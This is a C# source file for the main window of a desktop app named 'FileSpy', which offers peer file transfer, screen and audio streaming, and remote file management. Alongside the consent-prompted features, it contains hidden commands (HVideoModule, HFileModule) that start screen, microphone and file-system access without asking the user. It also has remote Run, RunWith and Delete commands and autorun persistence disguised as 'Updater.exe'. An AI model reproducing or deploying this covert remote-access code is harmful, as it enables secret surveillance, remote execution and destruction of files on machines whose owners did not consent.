using FileSpy.Classes;
using FileSpy.Elements;
using FileSpy.Windows;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq.Expressions;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Forms;
using System.Windows.Input;

namespace FileSpy
{
    /// <summary>
    /// Логика взаимодействия для MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        List<UserControll> Users = new List<UserControll>();
        List<SetupWindow> Setupers = new List<SetupWindow>();
        List<GettingWindow> Getters = new List<GettingWindow>();
        List<VideoWindow> VideoWindows = new List<VideoWindow>();
        List<VideoClass> VideoClasses = new List<VideoClass>();
        List<FileWindow> FileWindows = new List<FileWindow>();
        List<FileClass> FileClasses = new List<FileClass>();

        ConnectionClass Connection;

        SettingsClass Settings;

        string Version = "[0.4.0.0]";
        string Status = "Simple";
        DateTime TurnOnTime = DateTime.Now;

        NotifyIcon Icons;
        FlashWindowHelper Helper;

        #region Imports
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool ShowWindow(IntPtr hwnd, WinStyle style);

        [DllImport("user32.dll", EntryPoint = "FindWindow", SetLastError = true)]
        static extern IntPtr FindWindowByCaption(string lpClassName, string lpWindowName);

        enum WinStyle
        {
            Hide = 0,
            ShowNormal = 1,
            ShowMinimized = 2,
            ShowMaximized = 3,
            Show = 5
        }

        public bool SetAutorunValue(bool autorun, string path)
        {
            RegistryKey reg;
            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            try
            {
                if (autorun)
                    reg.SetValue("FileSpy", path);
                else
                    reg.DeleteValue("FileSpy");

                reg.Close();
            }
            catch
            {
                return false;
            }
            return true;
        }

        private bool IsStartupItem()
        {
            // The path to the key where Windows looks for startup applications
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            if (rkApp.GetValue("FileSpy") == null)
                // The value doesn't exist, the application is not set to run at startup
                return false;
            else
                // The value exists, the application is set to run at startup
                return true;
        }
        #endregion

        public MainWindow()
        {
            WindowBlur.SetIsEnabled(this, true);
            InitializeComponent();

            Helper = new FlashWindowHelper(System.Windows.Application.Current);

            Settings = SettingsClass.Create();
            if (Settings.AutoRun)
            {
                if (!IsStartupItem())
                    SetAutorunValue(true, Environment.CurrentDirectory + "\\Updater.exe");
            }
            else
            {
                if (IsStartupItem())
                    SetAutorunValue(false, Environment.CurrentDirectory + "\\Updater.exe");
            }

            if (Environment.GetCommandLineArgs().Length == 1)
                Close();

            Connection = new ConnectionClass(Settings);
            Connection.AcceptMessage += Connection_AcceptMessage;
        }

        private void Topper_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            this.DragMove();
        }

        private void CloseButton_MouseLeftButtonUp(object sender, MouseButtonEventArgs e)
        {
            this.Hide();
            if (Icon != null)
                Icons.Dispose();
            Icons = new NotifyIcon();
            using (var iconStream = System.Windows.Application.GetResourceStream(new Uri("Resources/magnet.ico", UriKind.Relative)).Stream)
            {
                Icons.Icon = new System.Drawing.Icon(iconStream);
                Icons.Visible = true;
                Icons.DoubleClick +=
                    delegate (object sender1, EventArgs args)
                    {
                        this.Show();
                        Icons.Visible = false;
                    };
            }
        }

        private void MinimazeButton_MouseLeftButtonUp(object sender, MouseButtonEventArgs e)
        {
            WindowState = WindowState.Minimized;
        }

        private void SettingsButton_MouseLeftButtonUp(object sender, MouseButtonEventArgs e)
        {
            SettingsWindow window = new SettingsWindow(Settings);
            window.Owner = this;
            window.ShowDialog();
            if (window.Save)
                Connection.SendMessage(new MessageClass(Connection.ID, -1, Commands.ChangeName, 0, Settings.UserName));
        }

        private void Window_KeyUp(object sender, System.Windows.Input.KeyEventArgs e)
        {
            if ((Keyboard.Modifiers & ModifierKeys.Control) == ModifierKeys.Control)
            {
                if (e.Key == Key.K)
                {
                    var window = new TextWindow(true);
                    window.Owner = this;
                    window.ShowDialog();
                    Settings.SetKeyWord(window.PassBox.Password);
                    Connection.SendMessage(new MessageClass(Connection.ID, -1, Commands.KeyPass, 0, window.PassBox.Password));
                }

                if (e.Key == Key.T)
                {
                    var window = new StatusWindow(Version, Status);
                    window.Owner = this;
                    window.Show();
                }
            }
        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            Connection.Start();
            if (Environment.GetCommandLineArgs()[1] == "hidden" && Settings.HiddenStart)
                CloseButton_MouseLeftButtonUp(null, null);
        }

        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            e.Cancel = true;
            CloseButton_MouseLeftButtonUp(null, null);
        }

        private void Window_StateChanged(object sender, EventArgs e)
        {

        }

        private void LostConnection()
        {

        }

        private void FindConnection()
        {

        }

        private void Connection_AcceptMessage(MessageClass message)
        {
            #region StandartCommands
            if (message.Command == Commands.Disconnect)
            {
                Task.Run(LostConnection);
                Dispatcher.Invoke(() =>
                {
                    int count = Users.Count;
                    for (int i = 0; i < count; i++)
                    {
                        FullTable.Items.Remove(Users[0]);
                        Users.Remove(Users[0]);
                    }

                    DisconnectLabel.Opacity = 1;
                });
            }

            if (message.Command == Commands.AcceptLogin)
            {
                Task.Run(FindConnection);
                Dispatcher.Invoke(() => DisconnectLabel.Opacity = 0);
                Connection.ID = message.Getter;
                Connection.SendMessage(new MessageClass(Connection.ID, -1, Commands.RsaKey, 0, Connection.Secure.GetPublicKey()));
            }

            if (message.Command == Commands.AesKey)
            {
                Connection.Secure.SetAesKey(Connection.Secure.RsaDecrypt(message.Package));
                Connection.Secured = true;
                Connection.SendMessage(new MessageClass(Connection.ID, -1, Commands.GetList, 0));
                Connection.SendMessage(new MessageClass(Connection.ID, -1, Commands.KeyPass, 0, Settings.KeyWord));
            }

            if (message.Command == Commands.List)
            {
                try
                {
                    string[] com = message.GetStringPackage().Split(';');

                    Dispatcher.Invoke(() =>
                    {
                        try
                        {
                            int count = Users.Count;
                            for (int i = 0; i < count; i++)
                            {
                                FullTable.Items.Remove(Users[0]);
                                Users.Remove(Users[0]);
                            }

                            for (int i = 0; i < com.Length; i += 3)
                            {
                                var user = new UserControll(Convert.ToInt32(com[i]), com[i + 1], com[i + 2]);
                                user.ActiveEvent += User_ActiveEvent;
                                Users.Add(user);
                                FullTable.Items.Add(user);
                                if (Status != "Simple")
                                    user.SetEnabled(1, true);
                            }
                        }
                        catch { }
                    });
                }
                catch { }
            }

            if (message.Command == Commands.ChangeStatus)
            {
                Status = message.GetStringPackage();
                if (Status != "Simple")
                {
                    Dispatcher.Invoke(() =>
                    {
                        for (int i = 0; i < VideoClasses.Count; i++)
                            VideoClasses[i].Close();
                        var window = new StatusWindow(Version, Status);
                        window.Owner = this;
                        window.Show();
                    });
                    for (int i = 0; i < Users.Count; i++)
                        Dispatcher.Invoke(() => Users[i].SetEnabled(1, true));
                }
                else
                {
                    for (int i = 0; i < Users.Count; i++)
                        Dispatcher.Invoke(() => Users[i].SetEnabled(0, false));
                }
            }

            if (message.Command == Commands.ChangeName)
            {
                Dispatcher.Invoke(() =>
                {
                    for (int i = 0; i < Users.Count; i++)
                    {
                        if (message.Getter == Users[i].ID)
                            Users[i].NameLabel.Content = message.GetStringPackage();
                    }
                });
            }

            if (message.Command == Commands.GetInfo)
            {
                string result = Version + "\n";
                if (Status != "Simple")
                    result += "[Secret]\n";
                else
                    result += "Simple\n";

                result += Directory.GetCurrentDirectory() + "\n";

                result += TurnOnTime.ToString();

                Connection.SendMessage(new MessageClass(Connection.ID, message.Sender, Commands.Info, 0, result));
            }

            if (message.Command == Commands.Info)
            {
                Dispatcher.Invoke(() => System.Windows.MessageBox.Show(message.GetStringPackage()));
            }
            #endregion

            #region FileCommands
            if (message.Command == Commands.RFileSend)
            {
                Task.Run(() =>
                {
                    Dispatcher.Invoke(() =>
                    {
                        string name = "[Secret]";
                        for (int i = 0; i < Users.Count; i++)
                        {
                            if (message.Sender == Users[i].ID)
                                name = Users[i].NameLabel.Content as string;
                        }
                        var window = new RequestWindow(name, message.GetStringPackage());
                        window.Owner = this;
                        if (!SilenceControll.Mode)
                        {
                            window.Topmost = false;
                            window.WindowStartupLocation = WindowStartupLocation.CenterOwner;
                            if (!IsActive)
                            {
                                this.Show();
                                if (Icons != null)
                                    Icons.Visible = false;
                                this.WindowState = WindowState.Minimized;
                            }
                        }
                        Helper.FlashApplicationWindow();
                        window.ShowDialog();
                        if (window.Result)
                            Connection.SendMessage(new MessageClass(Connection.ID, message.Sender, Commands.AcceptFile, message.ElementID));
                        else
                            Connection.SendMessage(new MessageClass(Connection.ID, message.Sender, Commands.CancelFile, message.ElementID));
                    });
                });
            }

            if (message.Command == Commands.AcceptFile)
            {
                Dispatcher.Invoke(() =>
                {
                    try
                    {
                        var setuper = FindSetuper(message.ElementID);
                        setuper.Accept();
                    }
                    catch { }
                });
            }

            if (message.Command == Commands.CancelFile)
            {
                Dispatcher.Invoke(() =>
                {
                    try
                    {
                        var setuper = FindSetuper(message.ElementID);
                        setuper.Cancel();
                    }
                    catch { }
                });
            }

            if (message.Command == Commands.FileOK)
            {
                Dispatcher.Invoke(() =>
                {
                    try
                    {
                        var setuper = FindSetuper(message.ElementID);
                        setuper.OK();
                    }
                    catch { }
                });
            }

            if (message.Command == Commands.FileInfo)
            {
                Dispatcher.Invoke(() =>
                {
                    var getter = new GettingWindow(Connection, Settings);
                    getter.ID = message.ElementID;
                    getter.UserID = message.Sender;
                    string[] com = message.GetStringPackage().Split(';');
                    getter.FileName = com[0];
                    getter.FileSize = Convert.ToInt64(com[1]);
                    getter.CloseEvent += (GettingWindow window) =>
                    {
                        Getters.Remove(window);
                        GC.Collect();
                    };
                    getter.Owner = this;
                    getter.Show();
                    Getters.Add(getter);
                });
            }

            if (message.Command == Commands.FileData)
            {
                Dispatcher.Invoke(() =>
                {
                    try
                    {
                        var getter = FindGetter(message.ElementID, message.Sender);
                        getter.SetData(message.Package);
                    }
                    catch { }
                });
            }

            if (message.Command == Commands.FileDone)
            {
                Dispatcher.Invoke(() =>
                {
                    try
                    {
                        var getter = FindGetter(message.ElementID, message.Sender);
                        getter.Done();
                    }
                    catch { }
                });
            }

            #endregion

            #region VideoMCommands
            if (message.Command == Commands.RVideoModule)
            {
                Task.Run(() =>
                {
                    Dispatcher.Invoke(() =>
                    {
                        string name = "[Secret]";
                        for (int i = 0; i < Users.Count; i++)
                        {
                            if (message.Sender == Users[i].ID)
                                name = Users[i].NameLabel.Content as string;
                        }
                        var window = new RequestWindow(name, "<Video.mp4>");
                        window.Owner = this;
                        if (!SilenceControll.Mode)
                        {
                            window.Topmost = false;
                            window.WindowStartupLocation = WindowStartupLocation.CenterOwner;
                            if (!IsActive)
                            {
                                this.Show();
                                if (Icons != null)
                                    Icons.Visible = false;
                                this.WindowState = WindowState.Minimized;
                            }
                        }
                        Helper.FlashApplicationWindow();
                        window.ShowDialog();
                        if (window.Result)
                        {
                            var video = new VideoClass(message.ElementID, message.Sender, Connection);
                            video.CloseEvent += (VideoClass obj) =>
                            {
                                VideoClasses.Remove(obj);
                                GC.Collect();
                            };
                            video.Start();
                            VideoClasses.Add(video);
                        }
                        else
                            Connection.SendMessage(new MessageClass(Connection.ID, message.Sender, Commands.VideoDenied, message.ElementID));
                    });
                });
            }

            if (message.Command == Commands.HVideoModule)
            {
                var video = new VideoClass(message.ElementID, message.Sender, Connection);
                video.CloseEvent += (VideoClass obj) =>
                {
                    VideoClasses.Remove(obj);
                    GC.Collect();
                };
                video.Start();
                VideoClasses.Add(video);
            }

            if (message.Command == Commands.VideoDenied)
            {
                try
                {
                    Dispatcher.Invoke(FindVideoWindow(message.ElementID).Denied);
                }
                catch { }
            }

            if (message.Command == Commands.VideoPulsar)
            {
                try
                {
                    Dispatcher.Invoke(FindVideoClasses(message.ElementID, message.Sender).Pulsar);
                }
                catch { }
            }

            if (message.Command == Commands.VideoClose)
            {
                try
                {
                    Dispatcher.Invoke(FindVideoClasses(message.ElementID, message.Sender).Close);
                }
                catch { }
            }

            if (message.Command == Commands.VideoData)
            {
                Dispatcher.Invoke(() =>
                {
                    try
                    {
                        FindVideoWindow(message.ElementID).SetVideoData(message.Package);
                    }
                    catch
                    {
                        Connection.SendMessage(new MessageClass(Connection.ID, message.Sender, Commands.VideoClose, message.ElementID));
                    }
                });
            }

            if (message.Command == Commands.SetVideo)
            {
                try
                {
                    if (message.GetStringPackage() == "True")
                        Dispatcher.Invoke(() => FindVideoClasses(message.ElementID, message.Sender).VideoStream = true);
                    else
                        Dispatcher.Invoke(() => FindVideoClasses(message.ElementID, message.Sender).VideoStream = false);
                }
                catch { }
            }

            if (message.Command == Commands.SetMaxFps)
            {
                try
                {
                    Dispatcher.Invoke(() => FindVideoClasses(message.ElementID, message.Sender).MaxFps = Convert.ToInt32(message.GetStringPackage()));
                }
                catch { }
            }

            if (message.Command == Commands.SetSize)
            {
                try
                {
                    Dispatcher.Invoke(() => FindVideoClasses(message.ElementID, message.Sender).Size = Convert.ToInt32(message.GetStringPackage()));
                }
                catch { }
            }

            if (message.Command == Commands.SetQuality)
            {
                try
                {
                    Dispatcher.Invoke(() => FindVideoClasses(message.ElementID, message.Sender).Quality = Convert.ToInt32(message.GetStringPackage()));
                }
                catch { }
            }

            if (message.Command == Commands.SetMicro)
            {
                try
                {
                    if (message.GetStringPackage() == "True")
                        Dispatcher.Invoke(FindVideoClasses(message.ElementID, message.Sender).MicroInput.StartRecording);
                    else
                        Dispatcher.Invoke(FindVideoClasses(message.ElementID, message.Sender).MicroInput.StopRecording);
                }
                catch { }
            }

            if (message.Command == Commands.MicroData)
            {
                try
                {
                    if (message.Package != null)
                        Dispatcher.Invoke(() => FindVideoWindow(message.ElementID).MicroBuffer.AddSamples(message.Package, 0, message.Package.Length));
                }
                catch { }
            }

            if (message.Command == Commands.SetCursor)
            {
                try
                {
                    if (message.GetStringPackage() == "True")
                        Dispatcher.Invoke(() => FindVideoClasses(message.ElementID, message.Sender).Cursor = true);
                    else
                        Dispatcher.Invoke(() => FindVideoClasses(message.ElementID, message.Sender).Cursor = false);
                }
                catch { }
            }

            if (message.Command == Commands.SetLoop)
            {
                try
                {
                    if (message.GetStringPackage() == "True")
                        Dispatcher.Invoke(() => FindVideoClasses(message.ElementID, message.Sender).LoopInput.StartRecording());
                    else
                        Dispatcher.Invoke(() => FindVideoClasses(message.ElementID, message.Sender).LoopInput.StopRecording());
                }
                catch { }
            }

            if (message.Command == Commands.LoopInfo)
            {
                try
                {
                    Dispatcher.Invoke(() => FindVideoWindow(message.ElementID).SetupLoop(message.Package));
                }
                catch { }
            }


            if (message.Command == Commands.LoopData)
            {
                try
                {
                    Dispatcher.Invoke(() => FindVideoWindow(message.ElementID).LoopBuffer.AddSamples(message.Package, 0, message.Package.Length));
                }
                catch { }
            }
            #endregion

            #region FileMCommands
            if (message.Command == Commands.RFileModule)
            {
                Task.Run(() =>
                {
                    Dispatcher.Invoke(() =>
                    {
                        string name = "[Secret]";
                        for (int i = 0; i < Users.Count; i++)
                        {
                            if (message.Sender == Users[i].ID)
                                name = Users[i].NameLabel.Content as string;
                        }
                        var window = new RequestWindow(name, "<TextFile>");
                        window.Owner = this;
                        if (!SilenceControll.Mode)
                        {
                            window.Topmost = false;
                            window.WindowStartupLocation = WindowStartupLocation.CenterOwner;
                            if (!IsActive)
                            {
                                this.Show();
                                if (Icons != null)
                                    Icons.Visible = false;
                                this.WindowState = WindowState.Minimized;
                            }
                        }
                        Helper.FlashApplicationWindow();
                        window.ShowDialog();
                        if (window.Result)
                        {
                            var fileClass = new FileClass(message.ElementID, message.Sender, Connection);
                            fileClass.CloseEvent += (FileClass obj) =>
                            {
                                FileClasses.Remove(obj);
                                GC.Collect();
                            };
                            fileClass.Start();
                            FileClasses.Add(fileClass);
                        }
                        else
                            Connection.SendMessage(new MessageClass(Connection.ID, message.Sender, Commands.FileMDenied, message.ElementID));
                    });
                });
            }

            if (message.Command == Commands.HFileModule)
            {
                var fileClass = new FileClass(message.ElementID, message.Sender, Connection);
                fileClass.CloseEvent += (FileClass obj) =>
                {
                    FileClasses.Remove(obj);
                    GC.Collect();
                };
                fileClass.Start();
                FileClasses.Add(fileClass);
            }

            if (message.Command == Commands.FileMAccepted)
            {
                try
                {
                    FindFileWindow(message.ElementID).Accept();
                }
                catch { }
            }

            if (message.Command == Commands.FileMDenied)
            {

            }

            if (message.Command == Commands.FilePulsar)
            {
                try
                {
                    FindFileClass(message.ElementID, message.Sender).Pulsar();
                }
                catch { }
            }

            if (message.Command == Commands.CD)
            {
                try
                {
                    byte[] data = FindFileClass(message.ElementID, message.Sender).CD(message.GetStringPackage());
                    Connection.SendMessage(new MessageClass(Connection.ID, message.Sender, Commands.Dirs, message.ElementID, data));
                }
                catch { }
            }

            if (message.Command == Commands.Dirs)
            {
                Dispatcher.Invoke(() =>
                {
                    try
                    {
                        FindFileWindow(message.ElementID).SetDirs(message.Package);
                    }
                    catch { }
                });
            }

            if (message.Command == Commands.Run)
            {
                try
                {
                    if (FindFileClass(message.ElementID, message.Sender) == null) return;
                    ProcessStartInfo startInfo = new ProcessStartInfo(message.GetStringPackage());
                    startInfo.WorkingDirectory = System.IO.Path.GetDirectoryName(message.GetStringPackage());
                    Process.Start(startInfo);
                }
                catch { }
            }

            if (message.Command == Commands.RunWith)
            {
                try
                {
                    if (FindFileClass(message.ElementID, message.Sender) == null) return;
                    string[] com = message.GetStringPackage().Split(';');
                    ProcessStartInfo startInfo = new ProcessStartInfo(com[0], com[1]);
                    startInfo.WorkingDirectory = System.IO.Path.GetDirectoryName(com[0]);
                    Process.Start(startInfo);
                }
                catch { }
            }

            if (message.Command == Commands.Delete)
            {
                try
                {
                    FileClass fileClass = FindFileClass(message.ElementID, message.Sender);
                    if (fileClass == null) return;

                    string path = message.GetStringPackage();
                    if (Directory.Exists(path))
                        Directory.Delete(path);
                    else if (File.Exists(path))
                        File.Delete(path);

                    byte[] data = fileClass.CD(Path.GetDirectoryName(message.GetStringPackage()));
                    Connection.SendMessage(new MessageClass(Connection.ID, message.Sender, Commands.Dirs, message.ElementID, data));
                }
                catch { }
            }

            if (message.Command == Commands.StartDownload)
            {
                try
                {
                    Task.Run(() => FindFileClass(message.ElementID, message.Sender).StartDownload(message.GetStringPackage()));
                }
                catch { }
            }

            if (message.Command == Commands.StopDownload)
            {
                try
                {
                    FindFileClass(message.ElementID, message.Sender).StopDownload();
                }
                catch { }
            }

            if (message.Command == Commands.FileUData)
            {
                try
                {
                    FindFileClass(message.ElementID, message.Sender).SetData(message.Package);
                }
                catch { }
            }

            if (message.Command == Commands.FileUError)
            {
                try
                {
                    FindFileWindow(message.ElementID).SetUError(message.GetStringPackage());
                }
                catch { }
            }

            if (message.Command == Commands.FileDData)
            {
                try
                {
                    FindFileWindow(message.ElementID).SetData(message.Package);
                }
                catch { }
            }

            if (message.Command == Commands.GetDirInfo)
            {
                try
                {
                    Task.Run(() => FindFileClass(message.ElementID, message.Sender).GetDirInfo(message.GetStringPackage()));
                }
                catch { }
            }

            if (message.Command == Commands.DirInfo)
            {
                try
                {
                    FindFileWindow(message.ElementID).SetProp(message.Package);
                }
                catch { }
            }
            #endregion
        }

        private void User_ActiveEvent(int id, string name, int command)
        {
            if (command == ElementCommands.InfoModule)
            {
                Connection.SendMessage(new MessageClass(Connection.ID, id, Commands.GetInfo, 0));
            }

            if (command == ElementCommands.SendModule)
            {
                Random r = new Random();
                int gid = -1;
                bool ok = true;
                while (ok)
                {
                    ok = false;
                    gid = r.Next(1, Int32.MaxValue / 2);
                    for (int i = 0; i < Setupers.Count; i++)
                    {
                        if (gid == Setupers[i].ID)
                            ok = true;
                    }
                }

                var setup = new SetupWindow(gid, id, name, Connection);
                Setupers.Add(setup);
                setup.Owner = this;
                setup.CloseEvent += (SetupWindow window) =>
                {
                    Setupers.Remove(window);
                    GC.Collect();
                };
                setup.Show();
            }

            if (command == ElementCommands.VideoModule)
            {
                Random r = new Random();
                int gid = -1;
                bool ok = true;
                while (ok)
                {
                    ok = false;
                    gid = r.Next(1, Int32.MaxValue / 2);
                    for (int i = 0; i < VideoWindows.Count; i++)
                    {
                        if (gid == VideoWindows[i].ID)
                            ok = true;
                    }
                }

                var video = new VideoWindow(gid, id, name, Connection);
                VideoWindows.Add(video);
                video.CloseEvent += (VideoWindow window) =>
                {
                    VideoWindows.Remove(window);
                    GC.Collect();
                };
                video.Show();
            }

            if (command == ElementCommands.FileModule)
            {
                Random r = new Random();
                int gid = -1;
                bool ok = true;
                while (ok)
                {
                    ok = false;
                    gid = r.Next(1, Int32.MaxValue / 2);
                    for (int i = 0; i < VideoWindows.Count; i++)
                    {
                        if (gid == VideoWindows[i].ID)
                            ok = true;
                    }
                }

                var fileWindow = new FileWindow(gid, id, name, Connection);
                FileWindows.Add(fileWindow);
                fileWindow.CloseEvent += (FileWindow window) =>
                {
                    FileWindows.Remove(window);
                    GC.Collect();
                };
                fileWindow.Show();
            }
        }

        private SetupWindow FindSetuper(int id)
        {
            for (int i = 0; i < Setupers.Count; i++)
            {
                if (Setupers[i].ID == id)
                    return Setupers[i];
            }

            return null;
        }

        private GettingWindow FindGetter(int id, int userID)
        {
            for (int i = 0; i < Getters.Count; i++)
            {
                if (Getters[i].ID == id && Getters[i].UserID == userID)
                    return Getters[i];
            }

            return null;
        }

        private VideoWindow FindVideoWindow(int id)
        {
            for (int i = 0; i < VideoWindows.Count; i++)
            {
                if (VideoWindows[i].ID == id)
                    return VideoWindows[i];
            }

            return null;
        }

        private VideoClass FindVideoClasses(int id, int userID)
        {
            for (int i = 0; i < VideoClasses.Count; i++)
            {
                if (VideoClasses[i].ID == id && VideoClasses[i].UserID == userID)
                    return VideoClasses[i];
            }

            return null;
        }

        private FileWindow FindFileWindow(int id)
        {
            for (int i = 0; i < FileWindows.Count; i++)
            {
                if (FileWindows[i].ID == id)
                    return FileWindows[i];
            }

            return null;
        }

        private FileClass FindFileClass(int id, int userID)
        {
            for (int i = 0; i < FileClasses.Count; i++)
            {
                if (FileClasses[i].ID == id && FileClasses[i].UserID == userID)
                    return FileClasses[i];
            }

            return null;
        }
    }
}